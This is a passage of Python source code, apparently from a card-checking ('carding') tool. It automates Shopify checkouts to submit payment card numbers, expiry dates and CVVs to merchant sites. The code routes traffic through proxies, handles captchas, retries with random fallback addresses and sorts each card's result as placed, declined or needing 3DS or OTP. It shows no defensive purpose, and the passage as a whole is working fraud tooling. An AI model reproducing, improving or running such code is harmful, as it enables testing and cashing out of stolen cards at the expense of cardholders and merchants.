                                }}
                            },
                            'buyerIdentity': {
                                'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                                'email': email, 'emailChanged': False,
                                'phoneCountryCode': country_code,
                                'marketingConsent': [{'email': {'value': email}}],
                                'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                                'rememberMe': False
                            },
                            'tip': {'tipLines': []},
                            'taxes': {
                                'proposedAllocations': None,
                                'proposedTotalAmount': {'value': {'amount': str(_new_tax), 'currencyCode': currency}},
                                'proposedTotalIncludedAmount': None,
                                'proposedMixedStateTotalAmount': None,
                                'proposedExemptions': []
                            },
                            'note': {'message': None, 'customAttributes': []},
                            'localizationExtension': {'fields': []},
                            'nonNegotiableTerms': None,
                            'scriptFingerprint': {
                                'signature': None, 'signatureUuid': None,
                                'lineItemScriptChanges': [], 'paymentScriptChanges': [],
                                'shippingScriptChanges': []
                            },
                            'optionalDuties': {'buyerRefusesDuties': False},
                            'transformerFingerprintV2': transformer_fingerprint_v2
                        },
                        'operationName': 'Proposal'
                    }
                    if checkpoint_data:
                        _reprop_json_data['variables']['checkpointData'] = checkpoint_data

                    _, _t2, _ = await make_graphql_request_with_captcha_handling(
                        session, graphql_url, _gql_params, headers, _reprop_json_data,
                        checkout_url, max_retries=1, proxy=proxy
                    )

                    _new_queue_token = queueToken
                    _new_checkpoint = checkpoint_data
                    _new_handles = list(signed_handles) if signed_handles else []
                    try:
                        _j2 = json.loads(_t2)
                        _res2 = ((((_j2.get('data') or {}).get('session') or {}).get('negotiate') or {}).get('result') or {})
                        _new_queue_token = _res2.get('queueToken') or queueToken
                        _new_checkpoint = _res2.get('checkpointData') or checkpoint_data
                        queueToken = _new_queue_token
                        checkpoint_data = _new_checkpoint
                        _sp2 = _res2.get('sellerProposal') or {}
                        _dexp2 = _sp2.get('deliveryExpectations') or {}
                        _extracted = []
                        _seen2 = set()
                        for _el in (_dexp2.get('deliveryExpectations') or []):
                            if isinstance(_el, dict) and _el.get('signedHandle'):
                                if _el['signedHandle'] not in _seen2:
                                    _extracted.append(_el['signedHandle'])
                                    _seen2.add(_el['signedHandle'])
                        if _extracted:
                            _new_handles = _extracted
                        _deld = _sp2.get('delivery') or {}
                        if _deld.get('__typename') == 'FilledDeliveryTerms':
                            _dl = _deld.get('deliveryLines') or []
                            if _dl:
                                _sel = _dl[0].get('selectedDeliveryStrategy') or {}
                                _avail = _dl[0].get('availableDeliveryStrategies') or []
                                if _sel.get('handle'):
                                    _new_strat = _sel['handle']
                                elif _avail:
                                    _new_strat = _avail[0].get('handle', _new_strat)
                                if _avail:
                                    _amt = _avail[0].get('amount') or {}
                                    try:
                                        _new_ship = float(_amt.get('value', {}).get('amount') or _amt.get('amount') or '0')
                                    except (ValueError, TypeError):
                                        pass
                        _dtax = _sp2.get('tax') or {}
                        if _dtax.get('__typename') == 'FilledTaxTerms':
                            _dta = _dtax.get('totalTaxAmount') or {}
                            try:
                                _new_tax = float(_dta.get('value', {}).get('amount') or _dta.get('amount') or '0')
                            except (ValueError, TypeError):
                                pass
                        _dtot = _sp2.get('total') or _sp2.get('runningTotal') or {}
                        _dtot_amt = _dtot.get('value', {}).get('amount') or _dtot.get('amount')
                        if _dtot_amt:
                            _new_run = _dtot_amt
                    except Exception:
                        pass

                    _new_tp = str(round(float(_new_run) + _new_ship + _new_tax, 2)) if _new_run else total_price
                    total_price = _new_tp
                    running_total = _new_run

                    _fb_bill = {'streetAddress': {
                        'address1': street, 'address2': address2, 'city': city,
                        'countryCode': country_code, 'postalCode': s_zip,
                        'firstName': firstName, 'lastName': lastName,
                        'zoneCode': state, 'phone': phone
                    }}
                    _nsv = {
                        'input': {
                            'sessionInput': {'sessionToken': sst},
                            'queueToken': _new_queue_token or '',
                            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                            'delivery': {
                                'deliveryLines': [{
                                    'destination': {'streetAddress': _fb_bill},
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyByHandle': {
                                            'handle': _new_strat or '', 'customDeliveryRate': False
                                        },
                                        'options': {'phone': phone}
                                    },
                                    'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]},
                                    'deliveryMethodTypes': ['SHIPPING', 'LOCAL'],
                                    'expectedTotalPrice': {
                                        'value': {'amount': str(_new_ship), 'currencyCode': currency}
                                    },
                                    'destinationChanged': False
                                }],
                                'noDeliveryRequired': [],
                                'useProgressiveRates': True,
                                'prefetchShippingRatesStrategy': None,
                                'supportsSplitShipping': True
                            },
                            'merchandise': submit_variables['input']['merchandise'],
                            'payment': {
                                'totalAmount': {'any': True},
                                'paymentLines': [{
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': payment_identifier,
                                            'sessionId': token,
                                            'billingAddress': _fb_bill,
                                            'cardSource': None
                                        }
                                    },
                                    'amount': {'any': True},
                                    'dueAt': None
                                }],
                                'billingAddress': _fb_bill,
                                'creditCardBin': cc_clean[:8],
                                'allowStoreCredit': False
                            },
                            'buyerIdentity': submit_variables['input']['buyerIdentity'],
                            'taxes': {
                                'proposedAllocations': None,
                                'proposedTotalAmount': {'value': {'amount': str(_new_tax), 'currencyCode': currency}},
                                'proposedTotalIncludedAmount': None,
                                'proposedMixedStateTotalAmount': None,
                                'proposedExemptions': []
                            },
                            'tip': {'tipLines': []},
                            'note': {'message': None, 'customAttributes': []},
                            'localizationExtension': {'fields': []},
                            'nonNegotiableTerms': None,
                            'optionalDuties': {'buyerRefusesDuties': False}
                        },
                        'attemptToken': f"{attempt_token}-r{random.randint(1000,9999)}",
                        'metafields': [],
                        'analytics': {'requestUrl': checkout_url}
                    }
                    if _new_handles:
                        _nsv['input']['deliveryExpectations'] = {
                            'deliveryExpectationLines': [{'signedHandle': sh} for sh in _new_handles]
                        }
                    if _new_checkpoint:
                        _nsv['input']['checkpointData'] = _new_checkpoint

                    _nsd = {'query': MUTATION_SUBMIT, 'variables': _nsv, 'operationName': 'SubmitForCompletion'}
                    _, _ts, _ = await make_graphql_request_with_captcha_handling(
                        session, graphql_url, _submit_params, headers, _nsd,
                        checkout_url, max_retries=1, proxy=proxy
                    )
                    if not _ts or not _ts.strip() or _ts.strip().lower().startswith('<'):
                        return False, "CARD_DECLINED", gateway, total_price, currency
                    try:
                        _js = json.loads(_ts)
                        _sds = _js.get('data', {}).get('submitForCompletion', {})
                        _rts = _sds.get('__typename', '')
                        if _rts in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted', 'SubmitSuccessWithReceipt'):
                            _rcs = _sds.get('receipt') or {}
                            if _rcs.get('__typename') == 'ProcessedReceipt':
                                return True, "ORDER_PLACED", gateway, total_price, currency
                            _rid2 = _rcs.get('id')
                            if _rid2:
                                await asyncio.sleep(2)
                                _pd = {'query': QUERY_POLL, 'variables': {'receiptId': _rid2, 'sessionToken': sst}, 'operationName': 'PollForReceipt'}
                                for _ in range(3):
                                    _, _pt, _ = await make_graphql_request_with_captcha_handling(
                                        session, graphql_url, _poll_params, headers, _pd,
                                        checkout_url, max_retries=1, proxy=proxy
                                    )
                                    if is_captcha_required(_pt):
                                        return True, "CARD_DECLINED", gateway, total_price, currency
                                    try:
                                        _pj = json.loads(_pt)
                                        _prd = _pj.get('data', {}).get('receipt', {})
                                        if _prd:
                                            _ptn = _prd.get('__typename', '')
                                            if _ptn == 'ProcessedReceipt':
                                                return True, "ORDER_PLACED", gateway, total_price, currency
                                            elif _ptn == 'FailedReceipt':
                                                _pe = _prd.get('processingError', {})
                                                _pet = _pe.get('__typename', '')
                                                if _pet == 'PaymentFailed':
                                                    _pc = _pe.get('code', '')
                                                    _pm = _pe.get('messageUntranslated', '')
                                                    if _pc in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and _pm:
                                                        return True, _pm, gateway, total_price, currency
                                                    return True, _pc if _pc else 'PAYMENT_FAILED', gateway, total_price, currency
                                                return True, _pe.get('code') or _pet or 'UNKNOWN_ERROR', gateway, total_price, currency
                                            elif _ptn == 'ActionRequiredReceipt':
                                                return True, "OTP_REQUIRED", gateway, total_price, currency
                                            if _ptn in ('ProcessingReceipt', 'WaitingReceipt'):
                                                await asyncio.sleep(2)
                                                continue
                                    except Exception:
                                        pass
                                    if 'WaitingReceipt' in _pt:
                                        await asyncio.sleep(2)
                                    else:
                                        break
                                return False, "Poll timeout", gateway, total_price, currency
                        elif _rts == 'SubmitRejected':
                            _es = (_sds.get('errors') or [{}])[0]
                            _cs = _es.get('localizedMessage') or _es.get('nonLocalizedMessage') or _es.get('code', 'DECLINED')
                            _cs_chk = (_cs + ' ' + _es.get('code', '').replace('_', ' ')).lower()
                            if 'missing credit card session' in _cs_chk or 'credit card session information' in _cs_chk:
                                _cs = 'CARD_DECLINED'
                            return False, _cs, gateway, total_price, currency
                        elif _rts == 'SubmitFailed':
                            return False, _sds.get('reason', 'Payment failed'), gateway, total_price, currency
                        return False, "CARD_DECLINED", gateway, total_price, currency
                    except Exception as _e:
                        return False, str(_e), gateway, total_price, currency
                except Exception as _ex:
                    logger.debug(f"_reprop_and_submit exception: {_ex}")
                    return None

            # --- Main submit ---
            submit_json_data = {
                'query': MUTATION_SUBMIT,
                'variables': submit_variables,
                'operationName': 'SubmitForCompletion'
            }

            response, text, _ = await make_graphql_request_with_captcha_handling(
                session, graphql_url, _submit_params, headers, submit_json_data,
                checkout_url, max_retries=1, proxy=proxy
            )

            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency

            if "Your order total has changed." in text or '"ORDER_TOTAL_CHANGED"' in text:
                _new_total = None
                try:
                    _tj = json.loads(text)
                    _sr = _tj.get('data', {}).get('submitForCompletion', {})
                    _seller = _sr.get('sellerProposal', {})
                    for _k in ('runningTotal', 'totalAmount', 'total'):
                        _v = _seller.get(_k, {})
                        if isinstance(_v, dict):
                            _v = _v.get('value', _v)
                        if isinstance(_v, dict):
                            _v = _v.get('amount')
                        if _v and str(_v).replace('.', '', 1).isdigit():
                            _new_total = str(_v)
                            break
                    if not _new_total:
                        _m1 = re.search(r'"(?:runningTotal|totalAmount)"[^}]{0,200}?"amount"\s*:\s*"([0-9]+\.[0-9]+)"', text)
                        if _m1:
                            _new_total = _m1.group(1)
                except Exception:
                    pass
                if _new_total:
                    _new_tax = tax_amount
                    try:
                        _tj2 = json.loads(text)
                        _sr2 = _tj2.get('data', {}).get('submitForCompletion', {})
                        _sel2 = _sr2.get('sellerProposal', {})
                        _tax2 = _sel2.get('tax', {})
                        if _tax2 and _tax2.get('__typename') == 'FilledTaxTerms':
                            _ta2 = _tax2.get('totalTaxAmount', {}).get('value', {}).get('amount', None)
                            if _ta2 is not None:
                                _new_tax = float(_ta2)
                    except Exception:
                        pass
                    _new_full = str(round(float(_new_total) + shipping_amount + _new_tax, 2))
                    running_total = _new_total
                    tax_amount = _new_tax
                    total_price = _new_full

                    _new_token_for_retry = token
                    try:
                        _vr_otc = await session.post(
                            'https://checkout.pci.shopifyinc.com/sessions',
                            json=payload, headers=vault_headers
                        )
                        try:
                            _vtd_otc = json.loads(_vr_otc.text or '{}')
                            _t_otc = _vtd_otc.get('id')
                            if _t_otc:
                                _new_token_for_retry = _t_otc
                                token = _t_otc
                        except Exception:
                            pass
                    except Exception:
                        pass

                    try:
                        _retry_vars = json.loads(json.dumps(submit_variables))
                        _retry_vars['input']['taxes']['proposedTotalAmount'] = {
                            'value': {'amount': str(_new_tax), 'currencyCode': currency}
                        }
                        _retry_vars['input']['payment']['paymentLines'][0]['amount'] = {
                            'value': {'amount': str(_new_full), 'currencyCode': currency}
                        }
                        _retry_vars['input']['payment']['paymentLines'][0]['paymentMethod']['directPaymentMethod']['sessionId'] = _new_token_for_retry
                        submit_json_data = {
                            'query': MUTATION_SUBMIT,
                            'variables': _retry_vars,
                            'operationName': 'SubmitForCompletion'
                        }
                        response, text, _ = await make_graphql_request_with_captcha_handling(
                            session, graphql_url, _submit_params, headers, submit_json_data,
                            checkout_url, max_retries=1, proxy=proxy
                        )
                    except Exception:
                        return False, "ORDER_TOTAL_CHANGED", gateway, total_price, currency
                    if "Your order total has changed." in text or '"ORDER_TOTAL_CHANGED"' in text:
                        return False, "ORDER_TOTAL_CHANGED", gateway, total_price, currency
                else:
                    return False, "ORDER_TOTAL_CHANGED", gateway, total_price, currency

            if "The requested payment method is not available." in text:
                return False, "Payment method not available", gateway, total_price, currency

            if not text or not text.strip():
                return False, "Empty response (Submit)", gateway, total_price, currency
            _ts_check = text.strip()
            if _ts_check.lower().startswith(('<!doctype', '<html', '<?xml')):
                return False, "HTML block page (Submit)", gateway, total_price, currency

            rid = None
            try:
                resp_json = json.loads(text)
                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})

                if not submit_data:
                    errors = resp_json.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code')
                            if code:
                                return False, code, gateway, total_price, currency
                    return False, "Empty submit response", gateway, total_price, currency

                result_type = submit_data.get('__typename', '')

                if result_type in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted', 'SubmitSuccessWithReceipt'):
                    receipt = submit_data.get('receipt', {})
                    if receipt:
                        receipt_type = receipt.get('__typename', '')
                        if receipt_type == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        rid = receipt.get('id')
                        po = receipt.get('purchaseOrder') or {}
                        poll_sst = po.get('sessionToken')
                        if poll_sst and poll_sst != sst:
                            sst = poll_sst
                            headers['x-checkout-one-session-token'] = poll_sst
                    else:
                        return False, "SubmitSuccess but no receipt", gateway, total_price, currency

                elif result_type == 'SubmitFailed':
                    reason = submit_data.get('reason', 'Unknown')
                    _reason_lower = str(reason).lower()
                    _is_delivery_failed = (
                        'delivery details may have changed' in _reason_lower
                        or 'verify your shipping' in _reason_lower
                        or 'shipping method' in _reason_lower
                        or 'delivery_line_detail' in _reason_lower
                    )
                    if _is_delivery_failed:
                        _result = await _reprop_and_submit()
                        if _result is None:
                            return False, "PROCESSING_ERROR", gateway, total_price, currency
                        _ok3, _msg3, _gw3, _tp3, _cur3 = _result
                        return _ok3, _msg3, _gw3, _tp3, _cur3
                    return False, extract_clean_response(reason), gateway, total_price, currency

                elif result_type == 'SubmitRejected':
                    errors = submit_data.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code', '')
                            _loc_msg_lower = (error.get('localizedMessage', '') + ' ' + error.get('nonLocalizedMessage', '')).lower()
                            _is_delivery_changed = (
                                code in ('DELIVERY_DELIVERY_LINE_DETAIL_CHANGED', 'DELIVERY_LINE_DETAIL_CHANGED',
                                         'DELIVERY_DELIVERY_LINE_DETAILS_CHANGED')
                                or 'delivery details may have changed' in _loc_msg_lower
                                or 'verify your shipping' in _loc_msg_lower
                                or 'delivery_line_detail' in code.lower()
                            )
                            if _is_delivery_changed:
                                try:
                                    _result = await _reprop_and_submit()
                                    if _result is None:
                                        return False, "PROCESSING_ERROR", gateway, total_price, currency
                                    _ok, _msg, _gw2, _tp2, _cur2 = _result
                                    return _ok, _msg, _gw2, _tp2, _cur2
                                except Exception as _exc:
                                    _exc_str = str(_exc) or type(_exc).__name__
                                    if 'timeout' in _exc_str.lower():
                                        return False, "TIMEOUT", gateway, total_price, currency
                                    if 'proxy' in _exc_str.lower():
                                        return False, "PROXY_ERROR", gateway, total_price, currency
                                    return False, "CARD_DECLINED", gateway, total_price, currency

                            if code == 'ORDER_TOTAL_CHANGED':
                                _new_total3 = None
                                _seller3 = submit_data.get('sellerProposal', {})
                                for _k3 in ('runningTotal', 'totalAmount', 'total'):
                                    _v3 = _seller3.get(_k3, {})
                                    if isinstance(_v3, dict):
                                        _v3 = _v3.get('value', _v3)
                                    if isinstance(_v3, dict):
                                        _v3 = _v3.get('amount')
                                    if _v3 and str(_v3).replace('.', '', 1).isdigit():
                                        _new_total3 = str(_v3)
                                        break
                                if _new_total3:
                                    running_total = _new_total3
                                    total_price = _new_total3

                                    _new_token3 = token
                                    try:
                                        _vr3 = await session.post(
                                            'https://checkout.pci.shopifyinc.com/sessions',
                                            json=payload, headers=vault_headers
                                        )
                                        try:
                                            _vtd3 = json.loads(_vr3.text or '{}')
                                            _t3_new = _vtd3.get('id')
                                            if _t3_new:
                                                _new_token3 = _t3_new
                                                token = _t3_new
                                        except Exception:
                                            pass
                                    except Exception:
                                        pass

                                    try:
                                        _retry_vars3 = json.loads(json.dumps(submit_variables))
                                        _retry_vars3['input']['taxes']['proposedTotalAmount'] = {
                                            'value': {'amount': str(_new_total3), 'currencyCode': currency}
                                        }
                                        _retry_vars3['input']['payment']['paymentLines'][0]['amount'] = {
                                            'value': {'amount': str(_new_total3), 'currencyCode': currency}
                                        }
                                        _retry_vars3['input']['payment']['paymentLines'][0]['paymentMethod']['directPaymentMethod']['sessionId'] = _new_token3
                                        _retry_json3 = {
                                            'query': MUTATION_SUBMIT,
                                            'variables': _retry_vars3,
                                            'operationName': 'SubmitForCompletion'
                                        }
                                        _r3, _t3, _ = await make_graphql_request_with_captcha_handling(
                                            session, graphql_url, _submit_params, headers, _retry_json3,
                                            checkout_url, max_retries=1, proxy=proxy
                                        )
                                        if _t3 and _t3.strip() and not _t3.strip().lower().startswith('<'):
                                            _j3 = json.loads(_t3)
                                            _sd3 = _j3.get('data', {}).get('submitForCompletion', {})
                                            _rt3 = _sd3.get('__typename', '')
                                            if _rt3 in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted', 'SubmitSuccessWithReceipt'):
                                                _rc3 = _sd3.get('receipt') or {}
                                                if _rc3.get('__typename') == 'ProcessedReceipt':
                                                    return True, "ORDER_PLACED", gateway, total_price, currency
                                                _rid3 = _rc3.get('id')
                                                if _rid3:
                                                    rid = _rid3
                                                    break
                                            elif _rt3 == 'SubmitRejected':
                                                _e3 = (_sd3.get('errors') or [{}])[0]
                                                _c3 = _e3.get('localizedMessage') or _e3.get('nonLocalizedMessage') or _e3.get('code', 'DECLINED')
                                                return False, _c3, gateway, total_price, currency
                                            elif _rt3 == 'SubmitFailed':
                                                return False, _sd3.get('reason', 'Payment failed'), gateway, total_price, currency
                                    except Exception:
                                        pass
                                if not rid:
                                    return False, "ORDER_TOTAL_CHANGED", gateway, total_price, currency

                            localized_msg = error.get('localizedMessage', '')
                            non_localized_msg = error.get('nonLocalizedMessage', '')
                            detail = localized_msg or non_localized_msg or ''
                            _cc_check = (detail + ' ' + code.replace('_', ' ')).lower()

                            if 'missing credit card session' in _cc_check or 'credit card session information' in _cc_check:
                                try:
                                    _vr = await session.post(
                                        'https://checkout.pci.shopifyinc.com/sessions',
                                        json=payload, headers=vault_headers
                                    )
                                    try:
                                        _vtd = json.loads(_vr.text or '{}')
                                    except Exception:
                                        _vtd = {}
                                    _new_tok = _vtd.get('id')
                                    if _new_tok:
                                        token = _new_tok
                                        _retry_vars_cs = json.loads(json.dumps(submit_variables))
                                        _retry_vars_cs['input']['payment']['paymentLines'][0]['paymentMethod']['directPaymentMethod']['sessionId'] = _new_tok
                                        _retry_json_cs = {
                                            'query': MUTATION_SUBMIT,
                                            'variables': _retry_vars_cs,
                                            'operationName': 'SubmitForCompletion'
                                        }
                                        _, _tv, _ = await make_graphql_request_with_captcha_handling(
                                            session, graphql_url, _submit_params, headers, _retry_json_cs,
                                            checkout_url, max_retries=1, proxy=proxy
                                        )
                                        if _tv and _tv.strip() and not _tv.strip().lower().startswith('<'):
                                            _jv = json.loads(_tv)
                                            _sdv = _jv.get('data', {}).get('submitForCompletion', {})
                                            _rtv = _sdv.get('__typename', '')
                                            if _rtv in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted', 'SubmitSuccessWithReceipt'):
                                                _rcv = _sdv.get('receipt') or {}
                                                if _rcv.get('__typename') == 'ProcessedReceipt':
                                                    return True, "ORDER_PLACED", gateway, total_price, currency
                                                _ridv = _rcv.get('id')
                                                if _ridv:
                                                    rid = _ridv
                                                    break
                                            elif _rtv == 'SubmitRejected':
                                                _ev = (_sdv.get('errors') or [{}])[0]
                                                _ev_code = _ev.get('code', '')
                                                _ev_detail = _ev.get('localizedMessage') or _ev.get('nonLocalizedMessage') or ''
                                                return False, _ev_detail or _ev_code or 'DECLINED', gateway, total_price, currency
                                            elif _rtv == 'SubmitFailed':
                                                return False, _sdv.get('reason', 'Payment failed'), gateway, total_price, currency
                                except Exception:
                                    pass
                                if not rid:
                                    return False, "Card session expired, please retry", gateway, total_price, currency

                            _CODE_MAP = {
                                'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE':
                                    'No delivery available (site ships locally only)',
                                'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE':
                                    'No delivery available (site ships locally only)',
                                'REQUIRED_ARTIFACTS_UNAVAILABLE':
                                    'Checkout requirements not met',
                            }
                            if code in _CODE_MAP:
                                if (code == 'REQUIRED_ARTIFACTS_UNAVAILABLE'
                                        and not _requires_shipping
                                        and not _tried_digital):
                                    try:
                                        await asyncio.sleep(1)
                                        _, _rt, _ = await make_graphql_request_with_captcha_handling(
                                            session, graphql_url, _submit_params, headers, submit_json_data,
                                            checkout_url, max_retries=1, proxy=proxy
                                        )
                                        if (_rt and _rt.strip()
                                                and not _rt.strip()[:15].lower().startswith(('<', '<!d'))
                                                and not is_captcha_required(_rt)):
                                            _rj = json.loads(_rt)
                                            _rsd = _rj.get('data', {}).get('submitForCompletion', {})
                                            _rtn = _rsd.get('__typename', '')
                                            if _rtn in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted', 'SubmitSuccessWithReceipt'):
                                                _rrc = _rsd.get('receipt', {})
                                                if _rrc and _rrc.get('__typename') == 'ProcessedReceipt':
                                                    return True, "ORDER_PLACED", gateway, total_price, currency
                                                _rrid = _rrc.get('id')
                                                if _rrid:
                                                    rid = _rrid
                                                    break
                                    except Exception:
                                        pass
                                    if not rid:
                                        _pi = await fetch_products(ourl, proxy_str, physical_only=True)
                                        if isinstance(_pi, dict) and _pi.get('variant_id'):
                                            return await process_card(
                                                cc, mes, ano, cvv, ourl,
                                                variant_id=_pi['variant_id'],
                                                proxy_str=proxy_str,
                                                _tried_digital=True
                                            )

                                if (code in ('DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
                                             'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE')
                                        and not _delivery_retried[0]):
                                    _FALLBACK_CC = {
                                        'NZ': 'AU', 'AU': 'US', 'GB': 'US', 'DE': 'US',
                                        'FR': 'US', 'JP': 'US', 'IN': 'US', 'SG': 'US',
                                        'HK': 'US', 'CN': 'US', 'AE': 'US', 'CA': 'US',
                                        'SE': 'US', 'NO': 'US', 'DK': 'US', 'MX': 'US', 'CH': 'US',
                                    }
                                    _fb_key = _FALLBACK_CC.get(country_code)
                                    if _fb_key and _fb_key in book:
                                        _delivery_retried[0] = True
                                        _fb_entries = book[_fb_key]
                                        _fb_addr = random.choice(_fb_entries) if isinstance(_fb_entries, list) else _fb_entries
                                        _fb_result = await _addr_fallback_submit(_fb_addr)
                                        if _fb_result is not None:
                                            _ok_fb, _msg_fb, _gw_fb, _tp_fb, _cur_fb = _fb_result
                                            return _ok_fb, _msg_fb, _gw_fb, _tp_fb, _cur_fb
                                if not rid:
                                    return False, _CODE_MAP[code], gateway, total_price, currency

                            if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', ''):
                                if detail:
                                    return False, detail, gateway, total_price, currency
                            if code and not rid:
                                return False, code, gateway, total_price, currency
                    if not rid:
                        return False, "Submit Rejected", gateway, total_price, currency

                elif result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency

                if not rid:
                    receipt = submit_data.get('receipt', {})
                    if not receipt:
                        return False, "No receipt in submit response", gateway, total_price, currency
                    rid = receipt.get('id')
                    if not rid:
                        return False, "No receipt ID", gateway, total_price, currency

            except json.JSONDecodeError:
                return False, f"Invalid JSON (Submit): {text[:100]}", gateway, total_price, currency
            except Exception as e:
                return False, f"Parse error (Submit): {str(e)}", gateway, total_price, currency

            # --- _poll_fn (refreshes sst from shared headers) ---
            async def _poll_fn(receipt_id: str, sst: str, is_3ds_retry: bool = False,
                                wait_count: int = 0, **kwargs):
                sst = headers.get('x-checkout-one-session-token', sst)
                pd = {
                    'query': QUERY_POLL,
                    'variables': {'receiptId': receipt_id, 'sessionToken': sst},
                    'operationName': 'PollForReceipt'
                }
                for _ in range(5):
                    try:
                        pr, ptext, _ = await make_graphql_request_with_captcha_handling(
                            session, graphql_url, _poll_params, headers, pd,
                            checkout_url, max_retries=1, proxy=proxy
                        )
                        if pr is None:
                            await asyncio.sleep(2)
                            continue
                        pjson = json.loads(ptext) if ptext else {}
                        rec = pjson.get('data', {}).get('receipt', {})
                        if not rec:
                            await asyncio.sleep(2)
                            continue

                        po = rec.get('purchaseOrder') or {}
                        new_sst = po.get('sessionToken')
                        if new_sst and new_sst != sst:
                            sst = new_sst
                            headers['x-checkout-one-session-token'] = new_sst
                            pd['variables']['sessionToken'] = new_sst

                        tn = rec.get('__typename', '')
                        if tn == 'ProcessedReceipt':
                            return {"Response": "ORDER_PLACED", "Message": "ORDER_PLACED"}
                        if tn == 'ActionRequiredReceipt':
                            if is_3ds_retry and wait_count < 10:
                                await asyncio.sleep(5)
                                continue
                            return {"Response": "3DS_REQUIRED", "Message": "3DS Required"}
                        if tn == 'FailedReceipt':
                            err = rec.get('processingError', {})
                            code = err.get('code') or err.get('__typename') or 'UNKNOWN'
                            return {"Response": code, "Message": code}
                        await asyncio.sleep(2)
                    except Exception:
                        await asyncio.sleep(2)
                return None

            poll_json = {
                'query': QUERY_POLL,
                'variables': {'receiptId': rid, 'sessionToken': sst},
                'operationName': 'PollForReceipt'
            }

            await asyncio.sleep(2)
            final_text = ""
            poll_attempts = _cfg("POLL_ATTEMPTS", 15)
            max_delay = _cfg("POLL_MAX_DELAY", 4.0)

            for i in range(poll_attempts):
                if i > 0:
                    delay = min(1.0 + i * 0.3, max_delay)
                    await asyncio.sleep(delay)

                poll_json['variables']['sessionToken'] = sst

                response, final_text, _ = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, _poll_params, headers, poll_json,
                    checkout_url, max_retries=1, proxy=proxy
                )
                if not response:
                    final_text = ""
                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency

                try:
                    poll_json_resp = json.loads(final_text)
                    receipt_data = poll_json_resp.get('data', {}).get('receipt', {})
                    if receipt_data:
                        po = receipt_data.get('purchaseOrder') or {}
                        new_sst = po.get('sessionToken')
                        if new_sst and new_sst != sst:
                            sst = new_sst
                            headers['x-checkout-one-session-token'] = new_sst

                        typename = receipt_data.get('__typename', '')
                        if typename == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == 'FailedReceipt':
                            error = receipt_data.get('processingError', {})
                            error_type = error.get('__typename', '')
                            if error_type == 'PaymentFailed':
                                code = error.get('code', '')
                                msg = error.get('messageUntranslated', '')
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
                                    return True, msg, gateway, total_price, currency
                                return True, code if code else 'PAYMENT_FAILED', gateway, total_price, currency
                            code = error.get('code') or error_type or 'UNKNOWN_ERROR'
                            return True, code, gateway, total_price, currency
                        elif typename == 'ActionRequiredReceipt':
                            action = receipt_data.get('action', {}) or {}
                            action_url = (action.get('url', '') or action.get('offsiteRedirect', ''))
                            if not action_url and action.get('challengeData'):
                                try:
                                    cdata = _json_loads(action["challengeData"])
                                    action_url = cdata.get("acsUrl", "") or cdata.get("url", "")
                                except Exception:
                                    action_url = str(action.get("challengeData", ""))
                            if action_url:
                                result_3ds = await _handle_3ds_action(
                                    session=session,
                                    action_url=action_url,
                                    receipt_id=receipt_data.get('id') or rid,
                                    checkout_url=checkout_url,
                                    base_url=ourl,
                                    sst=sst,
                                    ua=_ua,
                                    client_hints=client_hints,
                                    proxy=proxy,
                                    poll_fn=_poll_fn,
                                )
                                resp_code = result_3ds.get("Response", "3DS_REQUIRED")
                                if resp_code == "ORDER_PLACED":
                                    return True, "ORDER_PLACED", gateway, total_price, currency
                                elif resp_code == "3DS_REQUIRED":
                                    return True, "3DS_REQUIRED", gateway, total_price, currency
                                else:
                                    return False, result_3ds.get("Message", resp_code), gateway, total_price, currency
                            else:
                                return True, "OTP_REQUIRED", gateway, total_price, currency
                        if typename in ('ProcessingReceipt', 'WaitingReceipt'):
                            await asyncio.sleep(2)
                            continue
                except Exception:
                    pass
                if 'WaitingReceipt' in final_text:
                    await asyncio.sleep(2)
                else:
                    break

            if 'CAPTCHA_REQUIRED' in final_text:
                return True, "CARD_DECLINED", gateway, total_price, currency
            if 'WaitingReceipt' in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency
            try:
                res_json = json.loads(final_text)
                result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
                if "shopify_payments" in str(res_json):
                    return True, "ORDER_PLACED", gateway, total_price, currency
                elif result:
                    return True, result, gateway, total_price, currency
                else:
                    return True, "MISMATCHED_BILL", gateway, total_price, currency
            except Exception:
                pass
            code = extract_between(final_text, '{"code":"', '"')
            final_lower = final_text.lower()
            if 'actionreq' in final_lower or 'action_required' in final_lower:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            elif 'processedreceipt' in final_lower:
                return True, "ORDER_PLACED", gateway, total_price, currency
            elif 'failedreceipt' in final_lower or 'declined' in final_lower:
                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
            return False, "Unknown Result", gateway, total_price, currency

    except asyncio.TimeoutError:
        return False, "TIMEOUT", gateway, total_price, currency
    except RequestsError as e:
